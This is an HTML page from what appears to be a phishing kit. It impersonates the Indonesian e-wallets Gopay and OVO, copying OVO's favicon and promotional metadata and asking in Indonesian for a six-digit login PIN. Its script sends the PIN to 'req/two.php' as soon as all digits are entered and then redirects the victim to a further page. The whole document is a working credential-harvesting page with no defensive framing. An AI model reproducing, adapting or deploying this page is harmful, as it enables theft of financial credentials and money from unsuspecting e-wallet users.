<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Gopay</title>
    <meta property="og:description" content="Jadikan transaksi lebih simpel, instan, aman dan dapatkan berbagai keuntungan lainnya!">
    <link rel="stylesheet" href="ast/main.css">
    <link rel="stylesheet" href="ast/pin.css">
    <link rel="stylesheet" href="ast/load.css">
    <link rel="icon" href="https://www.ovo.id/ovo_front_res/favicon.png" type="image/png" sizes="32x32">
    <link href='https://unpkg.com/boxicons@2.1.1/css/boxicons.min.css' rel='stylesheet'>
    <meta property="og:title" content="OVO | Join the rOVOlution in Payment, Points & Priority!">
    <meta property="twitter:title" content="OVO | Join the rOVOlution in Payment, Points & Priority!">
    <meta property="twitter:card" content="summary_large_image">
    <meta property="og:image:type" content="image/jpeg"> 
    <meta property="og:image" content="https://asset-a.grid.id/crop/37x215:610x629/700x465/photo/2022/08/10/4-cara-aman-transaksi-pakai-ovo-20220810095502.jpg">
    <meta property="twitter:image:src" content="https://asset-a.grid.id/crop/37x215:610x629/700x465/photo/2022/08/10/4-cara-aman-transaksi-pakai-ovo-20220810095502.jpg">
    <meta property="og:url" content="https://www.ovo.id">
    <meta property="og:description" content="Jadikan transaksi lebih simpel, instan, aman dan dapatkan berbagai keuntungan lainnya!">
    <meta property="twitter:description" content="Jadikan transaksi lebih simpel, instan, aman dan dapatkan berbagai keuntungan lainnya!">
    <style>
        /* Footer CSS */
        .footer {
            text-align: center; /* Center the content */
            margin-top: 20px; /* Space above the footer */
            padding: 10px 0; /* Padding around the footer */
            background-color: #f8f8f8; /* Background color */
        }
        .footer img {
            max-width: 100%; /* Ensure the image is responsive */
            height: auto; /* Maintain aspect ratio */
            width: 200px; /* Set a specific width */
        }
    </style>
</head>
<body>
    <div class="container page1">
        <div style="display:none;" class="load">
            <div class="box">
                <div class="circle one"></div>
                <div class="circle two"></div>
                <div class="circle three"></div>
            </div>
        </div>
        <div class="header">
            <i onclick="window.location.href='/'" class='bx bx-left-arrow-alt'></i>
        </div>
        <div class="title">
            <h3 class="b">Masukkin PIN Kamu</h3>
            <p class="r">Silakan ketik 6 digit PIN kamu buat login</p>
        </div>
        <form id="formPin">
            <div class="box-input-pin">
                <div class="clear"></div>
                <input name="pin1" id="pin1" class="inppin" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
                <input name="pin2" id="pin2" class="inppin" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
                <input name="pin3" id="pin3" class="inppin" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
                <input name="pin4" id="pin4" class="inppin" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
                <input name="pin5" id="pin5" class="inppin" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
                <input name="pin6" id="pin6" class="inppin" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
            </div>
        </form>
    </div>
    
    <!-- Footer -->
    <div class="footer">
        <img src="https://example.com/your-image.png" alt="Footer Image">
    </div>

<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script>
    $(document).ready(function() {
        $('.clear').click(function() {
            $('.inppin').val('');
            $('#pin1').focus();
        });
    })
</script>
<script>
    $('.inppin').on('input', function(event) {
        const inputs = $('.inppin');
        const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
        if (isAllFilled == true) {
            $(event.target).blur();
            sendPin();
        }
        const index = inputs.index(this);
        const currentValue = event.target.value;
        if (currentValue.length === 1) {
            if (index < inputs.length - 1) {
                inputs[index + 1].focus();
            }
        } else if (currentValue.length === 0) {
            if (index > 0) {
                inputs[index].focus();
            }
        }
    });
    $('.inppin').on('keydown', function(event) {
        const inputs = $('.inppin');
        const key = event.key;
        const index = inputs.index(this);
        if (key === 'Backspace' && event.target.value.length === 0) {
            if (index > 0) {
                inputs[index - 1].focus();
            }
        }
    });
</script>
<script>
    function sendPin(){
        $(".load").fadeIn();
        $.ajax({
            type: 'POST',
            url: 'req/two.php',
            data: $('#formPin').serialize(),
            dataType: 'text',
            success: function(){
                window.location.href = 'sec.php';
            }
        });
    };
</script>
</body>
</html>
